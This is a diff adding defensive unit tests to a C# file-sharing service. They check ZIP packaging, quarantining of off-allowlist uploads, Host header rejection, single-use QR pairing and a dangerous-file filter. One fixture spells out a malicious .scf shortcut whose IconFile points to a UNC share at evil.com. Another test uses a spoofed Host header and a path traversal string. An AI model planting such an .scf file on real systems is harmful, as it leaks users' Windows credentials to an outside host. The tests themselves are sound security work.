@@ -100,6 +100,38 @@ public sealed class FileeConnectTests : IDisposable
     }
 
     [Fact]
+    public async Task WriteFolderZipAsync_packages_folder_content_correctly()
+    {
+        var textContent = "Async ZIP streaming content";
+        using var stream = new MemoryStream(Encoding.UTF8.GetBytes(textContent));
+        await _manager.SaveStreamAsync(stream, "async_doc.txt", "sub/async_doc.txt", "pc", "text/plain");
+
+        using var zipStream = new MemoryStream();
+        await _manager.WriteFolderZipAsync("sub", zipStream, TestContext.Current.CancellationToken);
+        zipStream.Position = 0;
+
+        using var archive = new ZipArchive(zipStream, ZipArchiveMode.Read);
+        var entry = archive.Entries.FirstOrDefault(e => e.Name == "async_doc.txt");
+        Assert.NotNull(entry);
+
+        using var reader = new StreamReader(entry.Open(), Encoding.UTF8);
+        Assert.Equal(textContent, await reader.ReadToEndAsync(TestContext.Current.CancellationToken));
+    }
+
+    [Fact]
+    public async Task Off_allowlist_files_are_stored_with_bin_extension_on_disk()
+    {
+        var scfContent = "[Shell]\r\nCommand=2\r\nIconFile=\\\\evil.com\\share";
+        using var stream = new MemoryStream(Encoding.UTF8.GetBytes(scfContent));
+        var item = await _manager.SaveStreamAsync(stream, "malicious.scf", "malicious.scf", "mobile", "text/plain");
+
+        Assert.NotNull(item);
+        Assert.Equal("malicious.scf", item.Name);
+        Assert.EndsWith(".bin", item.DiskPath, StringComparison.OrdinalIgnoreCase);
+        Assert.True(File.Exists(item.DiskPath));
+    }
+
+    [Fact]
     public void Path_traversal_throws_argument_exception()
     {
         Assert.Throws<ArgumentException>(() => SharedFolderManager.CleanRelativePath("../../Windows/System32/calc.exe"));
@@ -238,6 +270,48 @@ public sealed class FileeConnectTests : IDisposable
     }
 
     [Fact]
+    public async Task Host_header_mismatch_is_rejected_as_bad_request()
+    {
+        var service = new FileeConnectService(NullLogger<FileeConnectService>.Instance, _manager);
+        await service.StartSessionAsync();
+        try
+        {
+            using var http = new HttpClient();
+            var req = new HttpRequestMessage(HttpMethod.Get, service.MobileUrl);
+            req.Headers.Host = "evil.example:3000";
+
+            var response = await http.SendAsync(req, TestContext.Current.CancellationToken);
+            Assert.Equal(HttpStatusCode.BadRequest, response.StatusCode);
+        }
+        finally
+        {
+            await service.StopSessionAsync();
+        }
+    }
+
+    [Fact]
+    public async Task Qr_pairing_secret_is_single_use()
+    {
+        var service = new FileeConnectService(NullLogger<FileeConnectService>.Instance, _manager);
+        await service.StartSessionAsync();
+        try
+        {
+            using var http = new HttpClient();
+
+            var firstResponse = await http.GetAsync(service.MobileUrl, TestContext.Current.CancellationToken);
+            Assert.Equal(HttpStatusCode.OK, firstResponse.StatusCode);
+
+            // Second request with same URL should now 404 because secret was consumed on first pair
+            var secondResponse = await http.GetAsync(service.MobileUrl, TestContext.Current.CancellationToken);
+            Assert.Equal(HttpStatusCode.NotFound, secondResponse.StatusCode);
+        }
+        finally
+        {
+            await service.StopSessionAsync();
+        }
+    }
+
+    [Fact]
     public void FileExecutionSafety_correctly_filters_dangerous_files()
     {
         Assert.True(FileExecutionSafety.IsSafeToOpenDirectly("photo.jpg"));
@@ -245,6 +319,9 @@ public sealed class FileeConnectTests : IDisposable
         Assert.True(FileExecutionSafety.IsSafeToOpenDirectly("readme.txt"));
         Assert.True(FileExecutionSafety.IsSafeToOpenDirectly("movie.mp4"));
 
+        Assert.False(FileExecutionSafety.IsSafeToOpenDirectly("vector.svg"));
+        Assert.False(FileExecutionSafety.IsSafeToOpenDirectly("config.xml"));
+        Assert.False(FileExecutionSafety.IsSafeToOpenDirectly("shortcut.scf"));
         Assert.False(FileExecutionSafety.IsSafeToOpenDirectly("virus.exe"));
         Assert.False(FileExecutionSafety.IsSafeToOpenDirectly("script.bat"));
         Assert.False(FileExecutionSafety.IsSafeToOpenDirectly("malware.ps1"));
